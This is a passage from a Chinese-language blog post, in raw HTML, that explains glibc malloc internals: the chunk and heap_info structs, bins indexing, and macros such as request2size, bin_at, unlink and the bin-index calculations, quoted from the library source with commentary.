class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h2 id="malloc和free的流程"><a href="#malloc和free的流程" class="headerlink" title="malloc和free的流程"></a>malloc和free的流程</h2><h3 id="malloc流程"><a href="#malloc流程" class="headerlink" title="malloc流程"></a>malloc流程</h3><hr><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/1678786338164.png" alt="malloc"></p><h3 id="free流程"><a href="#free流程" class="headerlink" title="free流程"></a>free流程</h3><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/1678786338155.png" alt="free"></p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><h3 id="bins数组相关"><a href="#bins数组相关" class="headerlink" title="bins数组相关"></a>bins数组相关</h3><p>bins数组存在于malloc_state结构体中,它被定义为一个长度为254的数组,但我们都知道真正只有126个bin,及有效下标为[0,251] (多的那两个被浪费了)。</p><p>每个bins都是一个指针,在串联bin中起到了重要作用,同一个bin的fd指针和bk指针被存储在相邻位置(例如bins[0]为unsortedbin的fd指针bins[1]为unsortedbin的bk指针)。</p><p>但其实在讲解过程中我们更多提及的是bin的下标,实际上bin数组是一个更抽象的概念，它实际<strong>并不存在</strong>,但使用bin数组下标与对应各个bin的关系更为直接，因此被更多的使用。</p><p>bins下标[X]与bin下标[Y]的关系为:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-17_203928.png" alt=""></p><p>这也就是为什么许多教程会说bin[0]和bin[127]不存在了,因为如果这样的话对应的bins下标就为-2和252,明显越界了。</p><p><strong>以上所述其实我也不是很确定，各种教程里面的要么语焉不详没头没尾，要么上下矛盾，我也只能根据源码以及一些比较靠谱的博客做出一种比较合理的解释</strong></p><p>我主要以这两个宏为根据,特别是第二个宏与我上面的公式对上了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION) ##这个只是smallbin的索引计算方式,但其他bin大差不差</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure><h3 id="largebin的双向链表"><a href="#largebin的双向链表" class="headerlink" title="largebin的双向链表"></a>largebin的双向链表</h3><p>largebin的双向链表与smallbin和unsortedbin不同在于,一个bin存在两个双向链表</p><p>其中一个与smallbin相同通过fd与bk将属于该bin的所有chunk串联</p><p>另一个则是通过fd_nextsize和bk_nextsize这个双向链表只串联<strong>每类大小中的一个</strong>,<strong>不包括节点bin</strong>.相同大小的chunk只有第一个会被串联，其余chunk的nextsize指针依然置为0.</p><h3 id="阅读代码"><a href="#阅读代码" class="headerlink" title="阅读代码"></a>阅读代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">victim一般代表被操作chunk</span><br><span class="line"></span><br><span class="line">fwd一般代表被操作chunk的下一个chunk</span><br><span class="line"></span><br><span class="line">bck一般代表被操作chunk的上一个chunk</span><br></pre></td></tr></table></figure><h3 id="chunk分配寻找"><a href="#chunk分配寻找" class="headerlink" title="chunk分配寻找"></a>chunk分配寻找</h3><ol><li>fastbin,tcachebin均为单链表,属于LIFO,头插头取,分配chunk主要利用fd指针</li><li>unsortedbin,smallbin,largebin均为双链表,属于FIFO,头插尾取,分配chunk主要利用bk指针,largebin有点特殊,不过大致与前两者相同</li></ol><h2 id="重要宏解释"><a href="#重要宏解释" class="headerlink" title="重要宏解释"></a>重要宏解释</h2><p>看源码最让人头大的无非各种宏了(建议在vscode中阅读源码,能直接找到声明处。)这里记几个重要的宏,顺便做点解释。</p><h3 id="chunk-at-offset"><a href="#chunk-at-offset" class="headerlink" title="chunk_at_offset"></a>chunk_at_offset</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><p>通过一个chunk指针和偏移得到另一个chunk</p><h3 id="retquest2size"><a href="#retquest2size" class="headerlink" title="retquest2size"></a>retquest2size</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure><p>调整栈对齐,其中第三个宏整合了前两个,<strong>第二个是重点</strong></p><p>一个细节</p><p>若申请大小零头&lt;=size_sz,则不额外分配这部分内存,而是将下一个chunk的prev_size用以存储这部分数据</p><p>若申请大小零头&gt;size_sz,则向下一个2*size_sz对齐,以求最小损耗</p><h3 id="set-head"><a href="#set-head" class="headerlink" title="set_head"></a>set_head</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br></pre></td></tr></table></figure><p>给切割或合并后新出现的chunk设置头</p><h3 id="chunksize"><a href="#chunksize" class="headerlink" title="chunksize"></a>chunksize</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p>得到一个chunk的大小,可选是否忽略inuse位</p><h3 id="inuse"><a href="#inuse" class="headerlink" title="inuse"></a>inuse</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse(p)      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span></span><br></pre></td></tr></table></figure><p>分别是得到一个chunk的inuse位,设置inuse位为1,设置inuse位为0.</p><h3 id="bin-at-m-i"><a href="#bin-at-m-i" class="headerlink" title="bin_at(m,i)"></a>bin_at(m,i)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure><p>其中offsetof (struct malloc_chunk, fd))是常数<strong>值为16</strong>,所需bin的表头与前两个bins数组元素被视为了一个malloc_chunk(对unsorted bin来说前两个虽然不是bins数组成员,但也可以这样做),也就是说最终的结果就是指向这个chunk的指针,且这个chunk的fd和bk刚好是这个bin的头与尾指针。</p><h3 id="first-b-与last-b"><a href="#first-b-与last-b" class="headerlink" title="first(b)与last(b)"></a>first(b)与last(b)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>里面的b一般就是bin_at的返回结果,于是刚好指向所需bin的头和尾。</p><h3 id="一些常数值"><a href="#一些常数值" class="headerlink" title="一些常数值"></a>一些常数值</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \                <span class="comment">//32</span></span></span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \         <span class="comment">//16</span></span></span><br><span class="line">  ? __alignof__ (<span class="type">long</span> <span class="type">double</span>) : <span class="number">2</span> * SIZE_SZ)</span><br></pre></td></tr></table></figure><p>MINSIZE宏定义了最小的有效分配大小(32)，它是为了确保分配的内存大小能够容纳一个堆块的头部信息和有效载荷而定义的。</p><p>MALLOC_ALIGNMENT定义了堆块的对齐方式，也就是堆块的起始地址必须是MALLOC_ALIGNMENT(16)的倍数。</p><h3 id="unlink-AV-P-BK-FD"><a href="#unlink-AV-P-BK-FD" class="headerlink" title="unlink(AV, P, BK, FD)"></a>unlink(AV, P, BK, FD)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \<span class="comment">//大小检查</span></span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \  <span class="comment">//链表完整性检查</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span><br><span class="line">    <span class="keyword">else</span> &#123;      \</span><br><span class="line">        FD-&gt;bk = BK;      \</span><br><span class="line">        BK-&gt;fd = FD;      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line">                <span class="keyword">else</span> &#123;      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">                  &#125;      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">              &#125;      \</span><br><span class="line">          &#125;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unlink的出现频率非常高,是一个很重要的宏</p><h4 id="在malloc"><a href="#在malloc" class="headerlink" title="在malloc"></a>在malloc</h4><ol><li>从largebin中取chunk(fastbin,smallbin,unsortedbin都不这样做)</li><li>从比请求的chunk所在的bin大的bin中取chunk</li></ol><h4 id="在free"><a href="#在free" class="headerlink" title="在free"></a>在free</h4><p>一般在free一个chunk-B时,若其前一个chunk-A或后一个chunk-C非top)处于空闲时,则会unlinkA或者C</p><p><strong>一个细节</strong>,被free的chunk定然是没有fd,bk这些指针的,它通过<strong>自己的地址</strong>与<strong>prev_size</strong>或<strong>size</strong>这两个字段的操作来得到上一个或下一个空闲chunk的地址</p><h4 id="在malloc-consolidate"><a href="#在malloc-consolidate" class="headerlink" title="在malloc_consolidate"></a>在malloc_consolidate</h4><p>合并物理相邻的低地址或高地址空闲chunk</p><h4 id="在realloc"><a href="#在realloc" class="headerlink" title="在realloc"></a>在realloc</h4><p>合并物理相邻高地址空闲 chunk</p><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>这一大串全是根据实际申请大小转换相应bin数组下标的宏</p><h3 id="REMOVE-FB-fb-victim-pp"><a href="#REMOVE-FB-fb-victim-pp" class="headerlink" title="REMOVE_FB(fb, victim, pp)"></a>REMOVE_FB(fb, victim, pp)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta"> != victim);\</span></span><br></pre></td></tr></table></figure><p>从fastbin中删除一个chunk</p><h3 id="binmap相关"><a href="#binmap相关" class="headerlink" title="binmap相关"></a>binmap相关</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"><span class="comment">//((1U &lt;&lt; BINMAPSHIFT) - 1)为常数31,最终得到一个0~31的数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span></span><br></pre></td></tr></table></figure><p><code>idx2block</code> 宏接受一个整数 <code>i</code>，并将其右移 <code>BINMAPSHIFT</code> 位，相当于将 <code>i</code> 除以 <code>1 &lt;&lt; BINMAPSHIFT</code>。这个值用于计算 <code>binmap</code> 数组中相应的块号。</p><p><code>idx2bit</code> 宏接受一个整数 <code>i</code>，并将其按位左移 <code>(i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1)</code> 位，这个值相当于将 <code>i</code> 对 <code>1 &lt;&lt; BINMAPSHIFT</code> 取余。这个值用于计算 <code>binmap</code> 数组中相应块的二进制位。</p><p><code>mark_bin</code> 宏接受一个指向 <code>malloc_state</code> 结构体的指针 <code>m</code> 和一个整数 <code>i</code>，它将 <code>binmap</code> 数组中相应的块标记为非空。</p><p><code>unmark_bin</code> 宏与 <code>mark_bin</code> 宏类似，它将 <code>binmap</code> 